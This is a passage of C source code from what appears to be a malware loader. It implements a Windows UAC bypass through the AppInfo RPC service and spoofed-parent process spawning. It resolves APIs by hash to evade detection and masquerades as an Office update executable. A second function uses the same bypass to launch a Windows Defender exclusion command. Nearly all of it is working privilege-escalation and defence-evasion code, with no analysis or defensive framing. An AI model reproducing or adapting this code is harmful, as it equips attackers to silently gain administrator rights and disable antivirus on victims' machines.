    pR->pGetWinDir   = (fnGetWinDir)    FetchExportAddress(pK32, GetWindowsDirectoryW_JOAAT);
    pR->pGetModFileW = (fnGetModFileW)  FetchExportAddress(pK32, GetModuleFileNameW_JOAAT);

    if (!pR->pWaitDbg || !pR->pContDbg || !pR->pDbgStop) {
        LOG("[!] UacBypass: kernel32 debug API resolution failed"); return FALSE;
    }

    *ppAdvapi32 = pAdv;
    return TRUE;
}

// ---- UacBypass: main entry point ----
BOOL UacBypass(IN PAPI_HASHING pApi) {
    // Path 1: already running from install path (msoia.exe) → skip bypass
    if (!IsFirstRunProcess(pApi)) {
        LOG("[*] UacBypass: running from install path, no bypass needed");
        return TRUE;
    }

    // Path 2: spawned child (has --install flag) → proceed to InstallAndTerminate
    if (IsInstallMode(pApi)) {
        LOG("[*] UacBypass: install mode, proceeding to InstallAndTerminate");
        return TRUE;
    }

    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pNtdll) return FALSE;

    // Path 3: medium IL original loader → AppInfo bypass → spawn child with --install → exit
    LOG("[*] UacBypass: performing AppInfo bypass...");
    UAC_RPCS rpcs    = {0};
    PVOID pAdvapi32  = NULL;
    PVOID pK32       = FindLoadedModuleW(L"KERNEL32.DLL");

    if (!ResolveRpcApis(pApi, &rpcs, &pAdvapi32)) return FALSE;

    WCHAR wSysDir[MAX_PATH] = {0};
    WCHAR wWinDir[MAX_PATH] = {0};
    if (!rpcs.pGetSysDir || !rpcs.pGetWinDir ||
        !rpcs.pGetSysDir(wSysDir, MAX_PATH)  ||
        !rpcs.pGetWinDir(wWinDir, MAX_PATH))
    {
        LOG("[!] UacBypass: GetSystemDirectoryW failed"); return FALSE;
    }

    HANDLE hElevated = NULL;
    if (!AcquireElevatedHandle(&rpcs, pAdvapi32, pNtdll,
                               wSysDir, wWinDir, &hElevated))
        return FALSE;

    // Get our own full path, quote it, and spawn an elevated copy of ourselves.
    // CreateProcessW(NULL, lpCmdLine, ...) tokenises at spaces, so a path like
    // "C:\Users\...\OfficeUpdate.exe" must be wrapped in double-quotes.
    WCHAR wSelfRaw[MAX_PATH]       = {0};
    WCHAR wSelfPath[MAX_PATH + 16] = {0};  // quotes + " --install" + NUL
    if (!rpcs.pGetModFileW || !rpcs.pGetModFileW(NULL, wSelfRaw, MAX_PATH)) {
        LOG("[!] UacBypass: GetModuleFileNameW failed");
        typedef NTSTATUS (NTAPI* fnClose3)(HANDLE);
        fnClose3 pCl = (fnClose3)FetchExportAddress(pNtdll, NtClose_JOAAT);
        if (pCl) pCl(hElevated);
        return FALSE;
    }
    // Build: "C:\path\to\OfficeUpdate.exe" --install
    wSelfPath[0] = L'"';
    UacWcsCpy(wSelfPath + 1, wSelfRaw, MAX_PATH);
    SIZE_T nSelf = UacWcsLen(wSelfPath);
    wSelfPath[nSelf++] = L'"';
    const WCHAR wInstFlag[] = L" --install";
    for (SIZE_T f = 0; wInstFlag[f]; f++) wSelfPath[nSelf + f] = wInstFlag[f];

    NTSTATUS ns = SpawnChildOfParent(pApi, pK32, hElevated, wSelfPath);

    typedef NTSTATUS (NTAPI* fnClose3)(HANDLE);
    fnClose3 pCl = (fnClose3)FetchExportAddress(pNtdll, NtClose_JOAAT);
    if (pCl) pCl(hElevated);

    if (!NT_SUCCESS(ns)) {
        LOG("[!] UacBypass: SpawnChildOfParent failed");
        return FALSE;
    }
    LOG("[+] UacBypass: elevated self spawned, terminating medium-IL process");

    // Small delay so elevated child has time to start before we exit
    typedef NTSTATUS (NTAPI* fnSleep)(HANDLE, BOOLEAN, PLARGE_INTEGER);
    // Use kernel32 Sleep instead
    typedef VOID (WINAPI* fnSleep2)(DWORD);
    fnSleep2 pSleep = (fnSleep2)FetchExportAddress(pK32, Sleep_JOAAT);
    if (pSleep) pSleep(1000);

    // Terminate medium-IL process; elevated copy continues
    fnNtTermProc pNtTerm = (fnNtTermProc)FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
    if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);

    return FALSE; // not reached
}

// ---- UacRunCommandElevated: run wCommand as child of elevated ComputerDefaults ----
// Called by Install.c for WD exclusion. Uses the same Phase1+2 AppInfo bypass
// but the payload is the WD exclusion powershell command (not our own EXE).
BOOL UacRunCommandElevated(
    IN PAPI_HASHING pApi,
    IN PVOID        pNtdll,
    IN LPWSTR       wSysDir,
    IN LPWSTR       wWinDir,
    IN LPWSTR       wCommand)
{
    UAC_RPCS rpcs    = {0};
    PVOID pAdvapi32  = NULL;
    if (!ResolveRpcApis(pApi, &rpcs, &pAdvapi32)) return FALSE;

    HANDLE hElevated = NULL;
    if (!AcquireElevatedHandle(&rpcs, pAdvapi32, pNtdll,
                               wSysDir, wWinDir, &hElevated))
        return FALSE;

    PVOID pK32 = FindLoadedModuleW(L"KERNEL32.DLL");
    NTSTATUS ns = SpawnChildOfParent(pApi, pK32, hElevated, wCommand);

    typedef NTSTATUS (NTAPI* fnClose4)(HANDLE);
    fnClose4 pCl = (fnClose4)FetchExportAddress(pNtdll, NtClose_JOAAT);
    if (pCl) pCl(hElevated);

    if (NT_SUCCESS(ns)) {
        LOG("[+] Install: WD exclusion command launched via elevated parent");
        return TRUE;
    }
    LOG("[!] Install: UacRunCommandElevated SpawnChildOfParent failed");
    return FALSE;
}

#endif /* UAC_BYPASS */
